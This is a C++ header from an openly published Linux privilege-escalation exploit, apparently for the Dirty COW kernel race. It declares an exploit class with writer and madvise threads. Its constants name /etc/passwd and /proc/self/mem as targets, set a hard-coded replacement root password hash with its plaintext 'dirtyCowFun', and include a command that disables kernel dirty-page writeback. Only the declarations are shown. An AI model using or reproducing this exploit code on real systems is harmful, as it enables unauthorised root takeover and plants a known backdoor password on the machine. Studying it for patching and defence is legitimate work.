#ifndef DCOW_H
#define DCOW_H

// -----------------------------------------------------------------
// Copyright (C) 2016  Gabriele Bonacini
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation; either version 3 of the License, or
// (at your option) any later version.
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software Foundation,
// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
// -----------------------------------------------------------------

#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <pwd.h>
#include <pty.h>
#include <string.h>
#include <termios.h>
#include <sys/wait.h>
#include <signal.h>

#define  BUFFSIZE    1024
#define  DEFSLTIME   300000
#define  PWDFILE     "/etc/passwd"
#define  BAKFILE     "./.ssh_bak"
#define  TMPBAKFILE  "/tmp/.ssh_bak"
#define  PSM         "/proc/self/mem"
#define  ROOTID      "root:"
#define  SSHDID      "sshd:"
#define  MAXITER     300
#define  DEFPWD      "$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/"
#define  TXTPWD      "dirtyCowFun\n"
#define  DISABLEWB   "echo 0 > /proc/sys/vm/dirty_writeback_centisecs\n"
#define  EXITCMD     "exit\n"
#define  CPCMD       "\\cp "
#define  RMCMD       "\\rm "

using namespace std;

class Dcow{
    private:
       bool              run,        rawMode,     opShell,   restPwd;
       void              *map;
       int               fd,         iter,        master,    wstat;
       string            buffer,     etcPwd,      etcPwdBak,
                         root,       user,        pwd,       sshd;
       thread            *writerThr, *madviseThr, *checkerThr;
       ifstream          *extPwd;
       ofstream          *extPwdBak;
       struct passwd     *userId;
       pid_t             child;
       char              buffv[BUFFSIZE];
       fd_set            rfds;
       struct termios    termOld,    termNew;
       ssize_t           ign;

       void exitOnError(string msg);
    public:
       Dcow(bool opSh, bool rstPwd);
       ~Dcow(void);
       int  expl(void);
};

#endif // DCOW_H
